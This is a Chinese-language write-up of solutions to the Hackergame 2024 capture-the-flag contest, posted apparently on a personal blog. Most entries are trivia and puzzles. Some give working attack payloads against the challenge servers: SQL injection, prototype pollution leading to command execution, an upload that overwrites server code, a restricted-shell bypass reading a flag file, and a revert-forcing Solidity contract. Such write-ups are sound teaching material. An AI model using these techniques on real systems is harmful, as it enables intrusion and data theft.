[Blog here](https://blog.ora.moe/post/40171)  
今年没时间打  
# 签到  
打开题目网站，直接点击提交，发现多出来一个pass参数，将其值从false改成true  
flag{WElCoME-70-h@cKErGamE-ANd-eNJoY-HACkiN9-2o24}

# 喜欢做签到的 CTFer 你们好呀 
可以从[平台主页](https://hack.lug.ustc.edu.cn/)找到[战队主页](https://www.nebuu.la/)  
在环境中打help得到命令列表，依次尝试所有指令，在env命令下得到flag1: 
 
flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula}

在DevTools找到js脚本[index.js](https://www.nebuu.la/_next/static/chunks/pages/index-5cb01f7ec808f452.js)  
查找flag字样，往下翻找到存有flag2的Base64  
"ZmxhZ3swa18xNzVfYV9oMWRkM25fczNjM3J0X2YxNGdfX19wbGVhc2Vfam9pbl91c191c3RjX25lYnVsYV9hbkRfdHdvX21hSm9yX3JlcXVpcmVtZW50c19hUmVfc2hvd25fc29tZXdoZXJlX2Vsc2V9"  
flag{0k_175_a_h1dd3n_s3c3rt_f14g___please_join_us_ustc_nebula_anD_two_maJor_requirements_aRe_shown_somewhere_else}

# 猫咪问答（Hackergame 十周年纪念版）  
1. 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）  
提示：填写教室编号，如 5207、3A101。  
https://lug.ustc.edu.cn/ =>  
https://lug.ustc.edu.cn/wiki/lug/events/hackergame/ =>  
[第二届安全竞赛（存档）](https://lug.ustc.edu.cn/wiki/sec/contest.html)

2. 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）  
提示：是一个非负整数。  
看五年比赛人数  
[2019](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/) 2682  
[2020](https://lug.ustc.edu.cn/news/2020/12/hackergame-2020/) 3733  
[2021](https://lug.ustc.edu.cn/news/2021/11/hackergame-2021/) 4023  
[2022](http://cybersec.ustc.edu.cn/2023/0404/c23847a597725/page.htm) 4500+  
[2023](https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/) 4100+  
然后逐个试过去  

3. Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）  
提示：仅由中文汉字构成。  
[答案](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)：程序员的自我修养  


4. 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）  
提示：是一个非负整数。  
Google Search `USENIX Security ustc email spoofing`
https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf Page 9
336

5. 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）  
提示：id 前 6 位，字母小写，如 c1e939。  
[Linux source code](https://github.com/torvalds/linux/commits/master/MAINTAINERS)  
很容易找到是这个[Commit](https://github.com/torvalds/linux/commit/6e90b675cf942e50c70e8394dfb5862975c3b3b2)  
所以答案 6e90b6  

6. 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）  
提示：首次打开本页时的 HTML 源代码，答案是一个非负整数  
https://lunary.ai/llama3-tokenizer 代入本页源码，然后±5测试
答案 1833

# 打不开的盒  
随便在网上找个[STL查看器](https://imagetostl.com/cn/view-stl-online#convert)  
然后就可以通过缩放看到Flag了

# 每日论文太多了！
[论文地址](https://dl.acm.org/doi/pdf/10.1145/3650212.3652145)  
打开PDF,Ctrl-F可以在第6页左上角看到flag here的高亮,但是看不到内容   
下载一个PDF编辑器，比如PDF4QT，拖走flag here的遮罩即可看到Flag

# 比大小王  
阅读源码，在`/game`下可以获取题目，`/submit`提交答案  
所以直接上脚本
```js
await (async function(){
  let q=await (await fetch("http://202.38.93.141:12122/game", {
    "headers": {
      "content-type": "application/json"
    },
    "body": "{}",
    "method": "POST",
  })).json();
  let a={inputs:q.values.map(([a,b])=>(a>b?">":"<"))};
  let sa=async ()=>fetch("http://202.38.93.141:12122/submit", {
    "headers": {
      "content-type": "application/json"
    },
    "body": JSON.stringify(a),
    "method": "POST",
  });
  setTimeout(sa,10000);
})()
```

# 旅行照片  
问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：X校区Y门，均为一个汉字）  
就16种可能，直接猜  
东校区西门  
问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：YYYYMMDD）  
https://www.bilibili.com/video/BV1yw4m1D7Y1/  
20240519  
题目 3-4  
问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）  
中央森林公园  
从垃圾桶里的`六安国科`可以确定六安市  
然后Google `“六安” “公园”` 可以找到`六安中央公园`  
搜索 `六安中央公园` 得到答案 `中央森林公园 `  
问题 4: 这个景观所在的景点的名字是？（三个汉字）  
坛子岭  
直接搜图可得  

# 不宽的宽字符  
首先wstring在内存中存的是UTF-16 LE,  
例如`foo` `(0066 006f 006f)`会被编码成 `(66 00 6f 00 6f 00)`  
但是转换的时候直接用了`(char*)wstring`  
所以char类型的filename就是`f\0o\0o\0you_cant_get_the_flag`  
在c中，以`\0`作为一个字符串的结束，那么在`\0`后加上的文件名后缀`you_cant_get_the_flag`没法被读取到  
那么要读取`Z:\\..\\theflag`就需要转换的结果为`5a 3a 5c 2e 2e 5c 09 68 65 66 6c 61 67 00`即`3a5a 2e5c 5c2e 6809 6665 616c 0067`即`Z:\\..\\theflag\0`  
其对应的UTF-16 LE表达就是`㩚⹜尮桴晥慬g`  

# PowerfulShell
从~中拆出l和s,从ls的执行结果中拆出h,然后执行sh就可以`cat ../flag`了
```sh
_1=~
_2=`${_1:2:1}${_1:7:1}`
${_1:7:1}${_2:9:1}
cat ../flag //flag{N0w_I_Adm1t_ur_tru1y_5He11_m4ster_18d192fcde}
```

# Node.js is Web Scale  
阅读源码，注意到对象原型`__proto__`可以改掉，并且命令列表也是个对象  
那么令`__proto__.a`=`cat /flag`,然后访问`/exec?cmd=a`就可得到flag

# PaoluGPT  
第一问，写个爬虫把整个聊天记录爬下来  
首先在页面上通过`JSON.stringify([...document.querySelectorAll("body > div > div > ul>*")].map(e=>e.children[0].href))`获得聊天对应的url  
然后
```js
let addresses=[
  "https://chal01-zbi9w2vn.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=2365ab2d-6ffb-4370-b2fe-5898f15a95b6",
  "https://chal01-zbi9w2vn.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=ba217730-6efe-42b1-a795-d5974458b72d",
  "https://chal01-zbi9w2vn.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=3e7c43a2-6554-4b6f-8d60-0e121b015a35",
  "..."
];
(async function(){
  let result=[];
  let results=[];
  for(let a of addresses){
    console.log(`Processing ${a}`);
    let res=await fetch(a,{
      headers:{
        "Cookie":`[REDACTED]`
      }
    });
    let text=await res.text();
    result.push(text);
  }
  require("fs").writeFileSync("a.json",JSON.stringify(result,null,2));
})()
```
```js
let fs=require("fs");
let a=JSON.parse(fs.readFileSync("./a.json").toString());
let found=[];
for(let b of a){
  if(b.includes("flag"))console.log(b);
  found.push(b);
}
```
第二问看服务端源码  
```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```
发现可以通过conversation_id参数注入sql  
所以注入`1' OR shown = false OR '2'='1`得到flag  

# 禁止内卷  
filename没有过滤，可以写入任何文件，那么可以直接覆盖掉服务端原文件  
```js
fetch("/submit", {
  "headers": {
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryBcdUhHlCFUzIwjRv",
  },
  "body": `------WebKitFormBoundaryBcdUhHlCFUzIwjRv\r\nContent-Disposition: form-data; name="file"; filename="/tmp/web/app.py"\r\nContent-Type: text/x-python\r\n\r\nfrom flask import Flask, render_template, request, flash, redirect\r\nimport secrets\r\nimport os\r\napp = Flask(__name__)\r\napp.secret_key = secrets.token_urlsafe(64)\r\n@app.route("/", methods=["GET"])\r\ndef index():\r\n     return str(open("answers.json").read())\r\n\r\n\r\n------WebKitFormBoundaryBcdUhHlCFUzIwjRv--\r\n`,
  "method": "POST"
});
```
然后即可访问到服务端answers.json原文件,通过`JSON.parse("[answer]").map(e=>e+65).map(e=>String.fromCharCode(e))`即可获得答案

# 强大的正则表达式  
## Easy(mod 16)  
只要最后四位能被16整除就行  
<details>
<summary>完整表达式</summary>
(1|2|3|4|5|6|7|8|9|0)*(0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984)
</details>

# 惜字如金 3.0
## 题目 A
手工补全到80个字符

# 无法获得的秘密
可以写个编码器塞到环境里去
编码器端
```html
<style> *{background-color: greenyellow;}</style><input id="a" type="file"><canvas id="b" width="1024" height="1024"></canvas>

<script type>
  let a=document.querySelector("#a");
  let b=document.querySelector("#b");
  a.addEventListener("input",async function(){
    let n=0;
    let buf=new Uint8Array(await a.files[0].arrayBuffer());
    let ctx=b.getContext("2d");
    ctx.fillStyle="#000000";
    ctx.fillRect(0,0,1024,1024);
    let bits=[];
    for(let r=0;r<buf.length;r++){
      for(let i=0;i<8;i++){
        bits.push((buf[r] & (1 << i)) !=0)
      }
    }
    let newClamp=new Uint8ClampedArray(1024*1024*4);
    for(let i=(1024*1024)*n;i<(1024*1024)*(n+1);i+=1){
      let target=(i-1024*1024*n)*4;num=bits[i]?0:255;
      newClamp[target+0]=num;
      newClamp[target+1]=num;
      newClamp[target+2]=num;
      newClamp[target+3]=255;
    }
    let imgData=new ImageData(newClamp,1024,1024);
    ctx.putImageData(imgData,0,0);
  });
</script>
```
改变n的值(0~3)，截图可以得到4张1024*1024的黑白图片  
怎么输入进环境的:  
打断点DevTools把NoVNC的`KeyBoard._sendKeyEvent`拉出来  
然后`"char".split("").forEach(e=>_sendKeyEvent(e, "", true, numlock, capslock))`把文字送进去  

解码器端
```html
<img id="a"><input id="c" type="file" /><a id="d" download="sec">as</a><canvas id="b" width="1024" height="1024"></canvas>

<script type>
  let a=document.querySelector("#a");
  let b=document.querySelector("#b");
  let c=document.querySelector("#c");
  let d=document.querySelector("#d");
  
  c.addEventListener("input",async ()=>{
    let buf=new Uint8Array(await c.files[0].arrayBuffer());
    let bc=new Blob([buf]);
    let burl=URL.createObjectURL(bc);
    a.src=burl;
  })
  a.addEventListener("load",async function(){
    /** @type {CanvasRenderingContext2D} */
    let ctx=b.getContext("2d");
    ctx.drawImage(a,0,0);
    let idata=ctx.getImageData(0,0,1024,1024).data;
    let bits=[];
    let buf=new Uint8Array(524288/4*1),s=0;
    for(let i=0;i<idata.length;i+=4){
      let sum=idata[i]+idata[i+1]+idata[i+2];
      bits.push(sum<382);
    }
    console.log(bits);
    for(let i=0;i<bits.length;i+=8){
      let s=bits.slice(i,i+8),num=0;
      for(let r=0;r<8;r++){
        if(s[r])num|=1<<r;
      }
      buf[i/8]=num;
    }
    let bc=new Blob([buf]);
    console.log(buf,idata,bc);
    let burl=URL.createObjectURL(bc);
    d.href=burl;
  }); 
</script>
```
将四张黑白图片依次导入，将文件下载下来  
然后将下载来的文件拼接起来即为512KiB的`secret`

# 链上转账助手
## 转账失败
## 转账又失败
第一问和第二问一样  
第一问只要revert就好，第二问调用transfer没限制gas，都可以直接assert停掉BatchTransfer合约执行
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

contract a{
    fallback() external payable {
        assert(false);
    }
}
```

# 不太分布式的软总线
## What DBus Gonna Do?
Google 可知如何调用DBus
```sh
#!/bin/sh
gdbus call -y -d cn.edu.ustc.lug.hack.FlagService \
              -o /cn/edu/ustc/lug/hack/FlagService \
              -m cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
              "@s 'Please give me flag1'"
```